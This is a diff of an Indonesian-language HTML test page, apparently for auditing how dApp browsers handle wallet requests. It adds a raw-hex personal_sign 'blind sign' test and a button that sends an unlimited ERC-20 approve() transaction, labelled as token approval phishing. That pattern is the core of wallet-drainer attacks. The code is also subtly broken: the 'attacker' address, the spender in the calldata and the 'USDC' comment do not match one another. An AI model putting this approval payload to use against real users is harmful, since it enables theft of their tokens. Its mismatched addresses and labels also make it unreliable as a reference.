@@ -2,66 +2,59 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>Sui/Web3 Security Test</title>
+    <title>Skenario Uji Audit Keamanan</title>
     <style>
         body { font-family: sans-serif; padding: 20px; line-height: 1.6; }
-        button { padding: 15px; font-size: 16px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 5px; }
-        #log { margin-top: 20px; color: #555; font-family: monospace; }
+        button { display: block; width: 100%; padding: 15px; margin-bottom: 10px; font-size: 16px; cursor: pointer; border: none; border-radius: 5px; color: white; }
+        .btn-connect { background: #6c757d; }
+        .btn-sign { background: #007bff; }
+        .btn-approval { background: #dc3545; }
+        #log { margin-top: 20px; padding: 10px; background: #f8f9fa; border: 1px solid #dee2e6; font-family: monospace; }
     </style>
 </head>
 <body>
     <h1>Audit Keamanan dApp Browser</h1>
-    <p>Gunakan tombol di bawah untuk mendeteksi provider dan mencoba request.</p>
-    
-    <button id="connectBtn">1. Hubungkan Wallet</button>
-    <button id="signBtn" style="background: #28a745;">2. Uji Blind Sign</button>
+    <button id="connectBtn" class="btn-connect">1. Hubungkan Wallet</button>
+    <button id="signBtn" class="btn-sign">2. Uji Blind Sign (Personal Sign)</button>
+    <button id="approvalBtn" class="btn-approval">3. Uji Token Approval Phishing</button>
 
-    <div id="log"></div>
+    <div id="log">Log aktivitas...</div>
 
     <script>
         const log = (msg) => document.getElementById('log').innerHTML += `<p>> ${msg}</p>`;
-        let selectedWallet = null;
+        let account = null;
 
-        // 1. Deteksi otomatis
+        // Hubungkan Wallet
         document.getElementById('connectBtn').addEventListener('click', async () => {
-            // Mencoba deteksi umum (Sui atau EVM)
-            if (window.suiWallet) {
-                selectedWallet = window.suiWallet;
-                log("Sui Wallet terdeteksi!");
-                await selectedWallet.requestPermissions([{ parentCapability: 'viewAccount' }]);
-                log("Berhasil terhubung ke Sui Wallet.");
-            } else if (window.ethereum) {
-                selectedWallet = window.ethereum;
-                log("EVM Provider terdeteksi!");
-                await selectedWallet.request({ method: 'eth_requestAccounts' });
-                log("Berhasil terhubung ke EVM Wallet.");
-            } else {
-                log("Error: Tidak ada wallet yang terdeteksi di window object.");
+            if (window.ethereum) {
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                account = accounts[0];
+                log("Terhubung: " + account);
             }
         });
 
-        // 2. Eksperimen Blind Sign
+        // Skenario 1: Blind Sign
         document.getElementById('signBtn').addEventListener('click', async () => {
-            if (!selectedWallet) return alert("Hubungkan wallet dulu!");
+            const msg = "0x556a6920636f626120616d616e"; // Data Hex Mentah
+            const result = await window.ethereum.request({ method: 'personal_sign', params: [msg, account] });
+            log("Hasil Sign: " + result);
+        });
 
+        // Skenario 2: Approval Phishing (Simulasi)
+        document.getElementById('approvalBtn').addEventListener('click', async () => {
+            // Data transaksi untuk memberikan izin (Approval) ke alamat penyerang
+            const txParams = {
+                to: '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D', // Contoh alamat penyerang
+                from: account,
+                data: '0x095ea7b3000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec7ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff', // Data approval USDC
+                value: '0x0'
+            };
+            
             try {
-                if (window.suiWallet) {
-                    // Payload Blind Message
-                    const msg = new TextEncoder().encode("Uji coba keamanan: Apakah pesan ini muncul dengan jelas?");
-                    const result = await selectedWallet.signPersonalMessage({ message: msg });
-                    log("Hasil (Sui): " + JSON.stringify(result));
-                } else if (window.ethereum) {
-                    // Payload Blind Message (Hex)
-                    const msg = "0x556a6920636f626120616d616e";
-                    const account = await selectedWallet.request({ method: 'eth_accounts' });
-                    const result = await selectedWallet.request({ 
-                        method: 'personal_sign', 
-                        params: [msg, account[0]] 
-                    });
-                    log("Hasil (EVM): " + result);
-                }
+                const txHash = await window.ethereum.request({ method: 'eth_sendTransaction', params: [txParams] });
+                log("Tx Hash: " + txHash);
             } catch (err) {
-                log("Error saat sign: " + err.message);
+                log("Error: " + err.message);
             }
         });
     </script>
